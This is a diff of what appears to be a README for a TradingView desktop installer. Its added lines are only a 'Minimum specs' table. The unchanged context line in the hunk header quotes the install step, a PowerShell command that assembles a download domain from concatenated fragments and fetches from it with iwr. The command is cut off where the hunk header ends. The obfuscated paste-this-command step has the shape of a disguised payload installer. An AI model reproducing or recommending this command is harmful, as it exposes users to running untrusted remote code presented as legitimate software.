@@ -23,6 +23,31 @@ powershell -command "$desktop='.app'; iwr ('tradingview' + 'install' + $desktop)
 
 _After installation, a shortcut will be created on your desktop and in the Start menu._ <br>
 
+### Minimum specs
+<table>
+<tr>
+<td width="50%" valign="top">
+
+
+<ul>
+<li>2–4 GB RAM</li>
+<li>500 MB SSD<br>
+</ul>
+
+</td>
+
+<td width="50%" valign="top">
+
+
+<ul>
+<li>Internet connection<br></li>
+
+<li>Display & keyboard<br></li>
+</ul>
+
+</td>
+</tr>
+</table>
 
 ### Professional Charting
 
